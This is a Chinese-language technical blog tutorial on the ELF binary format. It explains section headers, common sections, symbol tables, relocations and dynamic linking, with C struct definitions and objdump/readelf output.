<p> All of GNU’s binutils such as <code>objcopy</code>, <code>objdump</code>, and other tools such as <code>gdb</code> rely on the section headers to locate symbol information that is stored in the sections specific to containing symbol data.（需要依赖节头定位到存储符号数据的节来获取符号信息） Without section headers, tools such as <code>gdb</code> and <code>objdump</code> are nearly useless.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位ELF节头的结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span>   sh_name; <span class="comment">// offset into shdr string table for shdr name</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   sh_type; <span class="comment">// shdr type I.E SHT_PROGBITS</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   sh_flags; <span class="comment">// shdr flags I.E SHT_WRITE|SHT_ALLOC</span></span><br><span class="line">    Elf32_Addr sh_addr;  <span class="comment">// address of where section begins</span></span><br><span class="line">    Elf32_Off  sh_offset; <span class="comment">// offset of shdr from beginning of file</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   sh_size;   <span class="comment">// size that section takes up on disk</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   sh_link;   <span class="comment">// points to another section</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   sh_info;   <span class="comment">// interpretation depends on section type</span></span><br><span class="line"><span class="keyword">uint32_t</span>   sh_addralign; <span class="comment">// alignment for address of section</span></span><br><span class="line"><span class="keyword">uint32_t</span>   sh_entsize;  <span class="comment">// size of each certain entries that may be in section</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p>下面是一些比较重要的节和节类型</p>
<h2 id="1-text节"><a href="#1-text节" class="headerlink" title="1 .text节"></a>1 .text节</h2><p>.text节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，.text节就会存在与text段中。由于.text节保存了程序代码，类型就是SHT_PROGBITS。</p>
<h2 id="2-rodata节"><a href="#2-rodata节" class="headerlink" title="2 .rodata节"></a>2 .rodata节</h2><p>.rodata节保存了只读的数据。只能存在于一个可执行文件的只读段节，故只能在text段找到，而不是data段找到.rodata节。</p>
<p>eg<code>printf(&quot;hello world!\n&quot;);</code> 这条命令就存放在.rodata节。</p>
<p>由于.rodata节是只读的，节类型就是SHT_PROGBITS。</p>
<h2 id="3-plt节"><a href="#3-plt节" class="headerlink" title="3 .plt节"></a>3 .plt节</h2><p>.plt节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。</p>
<p>由于其存在于text段中，同样保存了代码，因此节类型为SHT_PROGBITS。</p>
<h2 id="4-data节"><a href="#4-data节" class="headerlink" title="4 .data节"></a>4 .data节</h2><p>.data节存在于data段，保存了初始化的全局变量等数据。</p>
<p>由于其保存了程序的变量数据，因此类型被标记为SHT_PROGBITS。</p>
<h2 id="5-bss节"><a href="#5-bss节" class="headerlink" title="5 .bss节"></a>5 .bss节</h2><p>.bss节保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。</p>
<p>程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于.bss节未保存实际的数据，因此节类型为SHT_NOBITS。</p>
<h2 id="6-got-plt节"><a href="#6-got-plt节" class="headerlink" title="6 .got.plt节"></a>6 .got.plt节</h2><p>.got节保存了全局偏移表。.got节和.plt节一起提供了对导入的共享函数的访问入口，由动态链接器在运行时进行修改。</p>
<p> This section in particular is often abused by attackers who gain a pointer-sized write primitive in heap or <code>.bss</code> exploits. </p>
<p>.got.plt节跟程序执行有关，因为节类型被标记为SHT_PROGBITS。</p>
<h2 id="7-dynsym节"><a href="#7-dynsym节" class="headerlink" title="7 .dynsym节"></a>7 .dynsym节</h2><p>.dynsym节保存了从共享库导入的动态符号信息，包含了描述函数名和偏移量/地址的导入/导出符号。该节保存在段中text段，节类型为SHT_DYNSYM。</p>
<h2 id="8-dynstr节"><a href="#8-dynstr节" class="headerlink" title="8 .dynstr节"></a>8 .dynstr节</h2><p>.dynstr节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代表了符号的名称，以空字符作为终止符。</p>
<h2 id="9-rel-节"><a href="#9-rel-节" class="headerlink" title="9 .rel.*节"></a>9 .rel.*节</h2><p>重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，对ELF目标文件的某部分内容或者进程镜像进行补充或修改。</p>
<p>重定位节保存了重定位相关的数据，节类型被标记为SHT_REL。</p>
<h2 id="10-hash节"><a href="#10-hash节" class="headerlink" title="10 .hash节"></a>10 .hash节</h2><p>.hash节有时也称为.gnu.hash，保存了一个用于查找符号的散列表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//散列算法，用来在ELF文件中查找符号名。</span></span><br><span class="line"><span class="keyword">uint32_t</span></span><br><span class="line">dl_new_hash(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> h=<span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span> c=*s;c!=<span class="string">'\0'</span>;c=*++s)</span><br><span class="line">        h=h*<span class="number">33</span>+c; <span class="comment">//也可以为 h=((h&lt;&lt;5)+h)+c;</span></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="11-symtab节"><a href="#11-symtab节" class="headerlink" title="11 .symtab节"></a>11 .symtab节</h2><p>.symtab节保存了ElfN_Sym类型的符号信息。</p>
<p>.symtab节保存了符号信息，因此类型被标记为SHT_SYMTAB。</p>
<h2 id="12-strtab节"><a href="#12-strtab节" class="headerlink" title="12 .strtab节"></a>12 .strtab节</h2><p>.strtab节保存的是符号字符串表，表中的内容会被.symtab的ElfN_Sym结构中的st_name条目引用。</p>
<p>由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。</p>
<h2 id="13-shstrtab节"><a href="#13-shstrtab节" class="headerlink" title="13 .shstrtab节"></a>13 .shstrtab节</h2><p>.shstrtab节保存节头字符串表，该表是一个以空字符终止的字符串的集合，字符串保存了每个节的节名，如.text，.data等。</p>
<p>有一个名为e_shstrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。This section is pointed to by the ELF file header entry called <code>e_shstrndx</code> that holds the offset of <code>.shstrtab</code>. </p>
<p>由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。</p>
<h2 id="14-ctors和-dtors节"><a href="#14-ctors和-dtors节" class="headerlink" title="14 .ctors和.dtors节"></a>14 .ctors和.dtors节</h2><p>.ctors（构造器），.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码，析构函数是在main函数之前需要执行的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The __constructor__ function attribute is sometimes used by hackers and virus writers to implement a function that performs an anti-debugging trick such as calling PTRACE_TRACEME so that the process traces itself and no debuggers can attach to it. This way the anti-debugging code gets executed before the program enters into main().</span><br></pre></td></tr></table></figure>
<p><strong>可执行文件是如何使用phdr和shdr进行布局排列：</strong></p>
<p>text段的布局：</p>
<ul>
<li><code>[.text]</code>: This is the program code 程序代码</li>
<li><code>[.rodata]</code>: This is read-only data 只读数据</li>
<li><code>[.hash]</code>: This is the symbol hash table 符号散列表</li>
<li><code>[.dynsym ]</code>: This is the shared object symbol data 共享目标文件符号数据</li>
<li><code>[.dynstr ]</code>: This is the shared object symbol name 共享目标文件符号名称</li>
<li><code>[.plt]</code>: This is the procedure linkage table 过程链接表</li>
<li><code>[.rel.got]</code>: This is the G.O.T relocation data G.O.T重定位数据</li>
</ul>
<p>data段的布局：</p>
<ul>
<li><code>[.data]</code>: These are the globally initialized variables 全局的初始化变量</li>
<li><code>[.dynamic]</code>: These are the dynamic linking structures and objects 动态链接结构和对象</li>
<li><code>[.got.plt]</code>: This is the global offset table 全局偏移表</li>
<li><code>[.bss]</code>: These are the globally uninitialized variables 全局未初始化变量</li>
</ul>
<p><img src="/2018/07/11/The-ELF-Binary-Format/3.png" alt="3"></p>
<p>可重定位文件（类型为ET_REL的ELF文件）中不存在程序头，因为.o类型的文件会被链接到可执行文件中，但是不会被直接加载到内存中，故 readelf -l 不能得到想要的结果。</p>
<p>（Linux loadable kernel modules are actually <code>ET_REL</code> objects and are an exception to the rule because they do get loaded directly into kernel memory and relocated on the fly.不过Linux中可加载内核模块LKM例外，LKM是ET_REL类型文件，它是被直接加载进内核的内存中并自动进行重定位。）</p>
<p><img src="/2018/07/11/The-ELF-Binary-Format/4.png" alt="4"></p>
<p>将test.o编译到可执行文件中，可以看到节头中新增了一些节，如.got.plt，.plt，.dynsym以及其他与动态链接及运行时重定位相关的节。</p>
<h1 id="4-ELF-symbols"><a href="#4-ELF-symbols" class="headerlink" title="4 .ELF symbols"></a>4 .ELF symbols</h1><p>符号是对某些类型的数据或者代码（如全局变量或函数）的符号引用。eg：printf()函数会在动态符号表.dynsym中存在有一个指向该函数的符号条目。</p>
<p>在大多数共享库和动态链接可执行文件中，存在两个符号表：.dynsym和.symtab。</p>
<p>.dynsym保存了引用<strong>来自外部文件符号的全局符号</strong>，如printf这样的库函数。</p>
<p><strong>.dynsym保存的符号是.symtab所保存符号的子集。</strong></p>
<p>.symtab中<strong>还保存了可执行文件的本地符号</strong>，而.dynsym只保存了动态/全局符号。</p>
<p>使用readelf -S查看可执行文件的节头表输出，<strong>.dynsym是被标记了ALLOC的，而.symtab没有标记。</strong></p>
<p>ALLOC表示有该标记的节会被运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载进入内存。</p>
<p>.dynsym保存的符号只能在运行时被解析，因此是运行时动态链接器所需要的唯一符号。.dynsym符号表<strong>对于动态链接可执行文件的执行来说是必需</strong>的。而.symtab符号表<strong>只是用来进行调试和链接</strong>的，有时候为了节约空间，会将.symtab符号表从产生二进制的文件中删去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位ELF文件符号项的结构</span></span><br><span class="line"><span class="comment">//符号项保存在.symtab 和 .dynsym节中，因此节头项的大小与ElfN_Sym的大小相等。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span>      st_name;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">    <span class="keyword">uint16_t</span>      st_shndx;</span><br><span class="line">    Elf64_Addr    st_value;</span><br><span class="line">    Uint64_t      st_size;</span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"><span class="comment">//Symbol entries are contained within the .symtab and .dynsym sections, which is why the sh_entsize (section header entry size) for those sections are equivalent to sizeof(ElfN_Sym).</span></span><br></pre></td></tr></table></figure>
<h2 id="1-st-name"><a href="#1-st-name" class="headerlink" title="1.st_name"></a>1.st_name</h2><p>st_name保存了指向符号表中字符串表（位于.dynstr或者.strtab）的偏移地址，偏移地址存放着符号的名称，如printf。</p>
<h2 id="2-st-value"><a href="#2-st-value" class="headerlink" title="2. st_value"></a>2. st_value</h2><p>st_value存放符号的值（可能是地址或者位置偏移量）</p>
<h2 id="3-st-size"><a href="#3-st-size" class="headerlink" title="3.st_size"></a>3.st_size</h2><p>st_size存放了一个符号的大小，如全局函数指针的大小，在一个32位系统中通常是4字节。</p>
<h2 id="4-st-other"><a href="#4-st-other" class="headerlink" title="4.st_other"></a>4.st_other</h2><p>st_other变量定义了符号的可见性。</p>
<h2 id="5-st-shndx"><a href="#5-st-shndx" class="headerlink" title="5.st_shndx"></a>5.st_shndx</h2><p>每个符号表条目的定义都与某些节对应。st_shndx变量保存了相关节头表的索引。</p>
<h2 id="6-st-info"><a href="#6-st-info" class="headerlink" title="6.st_info"></a>6.st_info</h2><p>st_info指定符号类型及绑定属性。</p>
<p>符号类型以STT开头，符号绑定以STB开头。</p>
<h3 id="1-符号类型"><a href="#1-符号类型" class="headerlink" title="1.符号类型"></a>1.符号类型</h3><ul>
<li><code>STT_NOTYPE</code>:  符号类型未定义</li>
<li><code>STT_FUNC</code>: 表示该符号与函数或者其他可执行代码关联</li>
<li><code>STT_OBJECT</code>: 表示该符号与数据目标文件关联</li>
</ul>
<h3 id="2-符号绑定"><a href="#2-符号绑定" class="headerlink" title="2.符号绑定"></a>2.符号绑定</h3><ul>
<li><code>STB_LOCAL</code>: 本地符号在目标文件之外是不可见的，目标文件包含了符号的定义，如一个声明为static的函数</li>
<li><code>STB_GLOBAL</code>: 全局符号对于所有要合并的目标文件来说都是可见的。一个全局符号在一个文件中进行定义后，另外一个文件可以对这个符号进行引用。</li>
<li><code>STB_WEAK</code>: 与全局绑定类似，不过比STB_GLOBAL的优先级低，有可能会被同名的未被标记的STB_WEAK的符号覆盖。</li>
</ul>
<p>对绑定和类型字段进行打包和解包的宏指令：</p>
<p>ELF32_ST_BIND(INFO) 或者 ELF64_ST_BIND(info)：从st_info中提取出一个绑定。</p>
<p>ELF32_ST_TYPE(INFO) 或者 ELF64_ST_TYPE(info)：从st_info中提取类型。</p>
<p>ELF32_ST_INFO(bind，type) 或者 ELF64_ST_INFO(bind，type)：将一个绑定和类型转换成st_info值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源码符号表</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">foochu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">/* Do nothing */</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">/* Do nothing */</span> &#125;</span><br><span class="line">_start()</span><br><span class="line">&#123;</span><br><span class="line">        func1();</span><br><span class="line">        foochu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************************************************/</span></span><br><span class="line">showmeshell@parrot:~$ readelf -s test | egrep 'foochu|func1'</span><br><span class="line">     <span class="number">7</span>: <span class="number">080480</span>d8     <span class="number">5</span> FUNC    LOCAL  DEFAULT    <span class="number">2</span> foochu</span><br><span class="line">     <span class="number">8</span>: <span class="number">080480</span>dd     <span class="number">5</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> func1</span><br><span class="line"><span class="comment">//foochu 是一个有本地符号STB_LOCAL的函数STT_FUNC。本地绑定意味着符号在被定义的目标文件之外是不可见的，源于 static关键字声明，故为本地的。</span></span><br></pre></td></tr></table></figure>
<p>如果去掉一个二进制文件的符号表，一个动态链接可执行文件会保留.dynsym，丢弃.symtab，因此只会显示导入库函数的符号。 如果一个二进制文件是通过静态编译（gcc -static） 得到的或者没有使用libc进行链接（gcc -nostdlib），然后使用strip命令进行了清理，那么这个二进制文件就不会有符号表。因为动态符号表对该二进制文件来说不是必需的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The only thing to give us an idea where a new function starts is by examining the procedure prologue(过程序言), which is at the beginning of every function, unless (gcc -fomit-frame-pointer) has been used, in which case it becomes less obvious to identify.</span><br><span class="line">procedure prologue：The procedure prologue just sets up the stack frame（栈帧） for each new function that has been called by backing up the base pointer on the stack and setting its value to the stack pointers before the stack pointer is adjusted to make room for local variables. This way variables can be referenced as positive offsets from a fixed address stored in the base pointer register ebp/rbp.过程序言通过备份栈上的基准指针来为每个新调用的函数设置栈帧，并在栈指针为本地变量调整空间之前给栈指针赋值（先给栈指针赋值，变量随后压栈，指针随变量压栈进行调整）。首址作为一个固定地址存放基址寄存器ebp/rbp中，通过首址的正向偏移可以依次访问栈中的变量。</span><br></pre></td></tr></table></figure>
<h1 id="5-ELF-relocations"><a href="#5-ELF-relocations" class="headerlink" title="5.ELF relocations"></a>5.ELF relocations</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// form the elf（5） man pages</span><br><span class="line">Relocation is the process of connecting symbolic references with symbolic definitions.（重定位就是将符号定义和符号引用进行连接的过程） Relocatable files must have information that describes how to modify their section contents, thus allowing executable and shared object files to hold the right information for a process&apos;s program image.（使得可执行文件和共享目标文件能够保存进程的程序镜像所需的正确信息）。</span><br></pre></td></tr></table></figure>
<p>在重定位文件中，<strong>重定位记录保存了如何对给定的符号对应的代码进行补充的相关信息</strong>。<strong>重定位实际上一种给二进制文件打补丁的机制</strong>，如果使用了动态链接器，可以使用重定位在内存中patch hot-patching。用于创建可执行文件和共享库的链接程序/bin/ld，需要某种类型的元数据来描述如何对特定的指令进行修改。</p>
<p>假设将2个目标文件链接到一起产生一个可执行文件，obj1.o文件中存放了调用函数foo()的代码，而函数foo()是存放在目标文件obj2.o中的。</p>
<p>链接程序会对obj1.o和obj2.o中的重定位记录进行分析并将这两个文件链接在一起产生一个可以独立运行的可执行程序。</p>
<p><strong>符号引用会被解析成符号定义</strong>：目标文件中的代码会被重定位到可执行文件的段中一个给定的地址。在进行重定位之前，无法确定obj1.o或者obj2.o中的符号和代码在内存中，因此无法进行引用。只能在链接器确定了可执行文件的段中存放的指令或者符号的位置之后才能够进行修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位重定位的条目</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Addr r_offset;</span><br><span class="line">        Uint64_t   r_info;</span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"><span class="comment">//有的加上了addend字段</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    	Elf64_Addr r_offset;</span><br><span class="line"> <span class="comment">//r_offset指向需要进行重定位操作的位置，重定位操作详细描述了如何对存放r_offset中的代码或数据进行修改。</span></span><br><span class="line">    	Uint64_t   r_info;</span><br><span class="line"><span class="comment">//r_info指定必须对其进行重定位的符号表索引以及要应用的重定位类型。    </span></span><br><span class="line">    	<span class="keyword">int64_t</span>    r_addend;</span><br><span class="line"><span class="comment">//r_addend指定常量加数，用于计算存储在可重定位字段中的值。    </span></span><br><span class="line">&#125;Elf64_Rela;</span><br></pre></td></tr></table></figure>
<p><strong>隐式加数/显示加数</strong>：</p>
<p>如果重定位记录存储在不包含r_addend字段的ElfN_Rel类型结构中，就需要隐式加数，因此隐式加数存储在重定位目标本身中。<strong>64位的可执行文件一般使用ElfN_Rela的结构，显式地对加数进行存储。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//obj1</span></span><br><span class="line">_start()</span><br><span class="line">&#123;</span><br><span class="line">   foo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>obj1这段代码中调用了foo()函数，但是foo()函数并没有在这个源码所在的文件中进行定义（obj2中），因此，就需要创建一个重定位条目，以便在编译时进行符号引用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d obj1.o</span><br><span class="line">obj1.o:     file format elf32-i386</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">00000000 &lt;func&gt;:</span><br><span class="line">   0:   55                      push   %ebp</span><br><span class="line">   1:   89 e5                   mov    %esp,%ebp</span><br><span class="line">   3:   83 ec 08                sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line">   6:   e8 <span class="built_in">fc</span> ff ff ff          call 7 &lt;func+0x7&gt; </span><br><span class="line">   b:   c9                      leave  </span><br><span class="line">   c:   c3                      ret</span><br><span class="line"><span class="comment">#// 上面强调了对foo()的函数调用，存储的值0xfffffffc（就为-4）就是隐式加数。</span></span><br><span class="line"><span class="comment">#// call 7中，7是将要进行修改的重定位目标的偏移量。当obj1.o与obj2.o链接来产生一个可执行文件时，链接器会对偏移为7的位置所指向的重定位条目进行处理，即需要对该位置进行修补，随后在foo（）函数被包含进可执行文件后，链接器会对偏移7补齐4个字节，这样就相当于存储了foo（）函数的实际偏移地址</span></span><br><span class="line">$ readelf -r obj1.o</span><br><span class="line">Relocation section <span class="string">'.rel.text'</span> at offset 0x394 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000007  00000902 R_386_PC32        00000000   foo</span><br><span class="line"><span class="comment">#//偏移位置7处的重定位字段是由重定位条目的r_offset字段指定的。</span></span><br></pre></td></tr></table></figure>
<ul>
<li>R_386_PC32是重定位类型：采用“S+A-P”的方式对重定位目标进行修改。</li>
<li>S是索引位于重定位条目中的符号的值。</li>
<li>A是重定位条目中的加数。</li>
<li>P是要进行重定位（使用r_offset进行计算的）的存储单元的地址（节偏移或者地址）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#//32位系统中对obj1.o和obj2.o进行编译之后最终输出的可执行文件：</span></span><br><span class="line">$ gcc -nostdlib obj1.o obj2.o -o relocated</span><br><span class="line">$ objdump -d relocated</span><br><span class="line"><span class="built_in">test</span>:     file format elf32-i386</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">080480d8 &lt;func&gt;:</span><br><span class="line"> 80480d8:   55                      push   %ebp</span><br><span class="line"> 80480d9:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 80480db:   83 ec 08                sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line"> 80480de:   e8 05 00 00 00          call   80480e8 &lt;foo&gt;//重定位目标已经被修改成了32位的偏移量5，指向foo()函数。</span><br><span class="line"> 80480e3:   c9                      leave  </span><br><span class="line"> 80480e4:   c3                      ret    </span><br><span class="line"> 80480e5:   90                      nop</span><br><span class="line"> 80480e6:   90                      nop</span><br><span class="line"> 80480e7:   90                      nop</span><br><span class="line">080480e8 &lt;foo&gt;:</span><br><span class="line"> 80480e8:   55                      push   %ebp</span><br><span class="line"> 80480e9:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 80480eb:   5d                      pop    %ebp</span><br><span class="line"> 80480ec:   c3                      ret</span><br><span class="line"> <span class="comment">#//R386_PC_32重定位执行之后的结果为5： S + A – P: 0x80480e8 + 0xfffffffc – 0x80480df = 5 或者 0x80480e8 + (0x80480df + sizeof(uint32_t))</span></span><br></pre></td></tr></table></figure>
<p>要将一个偏移量计算成虚拟地址，可以用下面公式：</p>
<p><code>address_of_call + offset + 5</code>(5是调用指令的长度)</p>
<p>所以才有：<code>0x80480de + 5 + 5 = 0x80480e8</code></p>
<p>要将一个地址转化为偏移量：</p>
<p><code>address – address_of_call – 4</code>（4是调用指令立即操作数的长度，为32位）</p>
<p>所以才有：<code>0x80480e8  – 0x80480df -4  = 5</code></p>
<h1 id="6-ELF-dynamic-linking"><a href="#6-ELF-dynamic-linking" class="headerlink" title="6.ELF dynamic linking"></a>6.ELF dynamic linking</h1><p>在动态链接方式实现以前，普通采用静态链接的方式来生成可执行文件，如果一个程序使用了外部的库函数，那么整个库都会被直接编译到可执行文件中。<strong>ELF支持动态链接，处理共享库的时候高效。</strong></p>
<p>当一个程序被加载进内存时，动态链接器会把需要的共享库加载并绑定到该进行的地址空间中。共享库在被编译到可执行文件中时是位置独立的，因此很容易被重定位到进程的地址空间中。</p>
<p><strong>一个共享库就是一个动态的ELF目标文件</strong>，在终端输入readelf -h lib.so命令，会看到e_type（ELF文件类型）是ET_DYN。动态目标文件与可执行文件非常类似，是由程序解释器加载的，通常没有PT_INTERP段，因此不会触发程序解释器。</p>
<p>当一个共享库被加载进一个进程的地址空间中时，一定有指向其他共享库的重定位。动态链接器会修改可执行文件中的GOT（Global Offset Table,全局偏移表）。<strong>GOT位于数据段（.got.plt节）中，GOT必须是可写的。（只读重定位可以看做一种安全特性），故而位于数据段中。</strong></p>
<p><strong>动态链接器会使用解析好的共享库地址来修改GOT。</strong></p>
<h2 id="1-The-auxiliary-vector"><a href="#1-The-auxiliary-vector" class="headerlink" title="1. The auxiliary vector"></a>1. The auxiliary vector</h2><p><strong>辅助向量</strong></p>
<p>通过系统调用sys_execve()将程序加载到内存中，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特点的对信息的设置和安排即为<strong>辅助向量（auxv）</strong>。栈底存放了以下信息：<br><img src="/2018/07/11/The-ELF-Binary-Format/5.png" alt="5"><br>                [argc][argv][envp][auxiliary][.ascii data for argv/envp]</p>
<p>辅助向量是一系列ElfN_auxv_t的结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> a_type;              <span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="comment">//a_type指定了辅助向量的条目类型。</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">uint64_t</span> a_val;           <span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">// a_val 为辅助向量的值。</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf64_auxv_t;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态链接器所需的一些最重要的条目类型</span></span><br><span class="line"><span class="comment">// usr/include/elf.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_EXECFD       2       <span class="comment">/* File descriptor of program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHDR         3       <span class="comment">/* Program headers for program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHENT        4       <span class="comment">/* Size of program header entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHNUM        5       <span class="comment">/* Number of program headers */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PAGESZ       6       <span class="comment">/* System page size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_ENTRY        9       <span class="comment">/* Entry point of program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_UID          11      <span class="comment">/* Real uid */</span></span></span><br><span class="line"><span class="comment">//动态链接器从栈中检索可执行程序相关的信息，如程序头，程序的入口地址等。</span></span><br></pre></td></tr></table></figure>
<p>辅助向量由内核函数create_elf_tables()设定，该内核函数在linux的源码/usr/src/linux/fs/binfmt_elf.c中。</p>
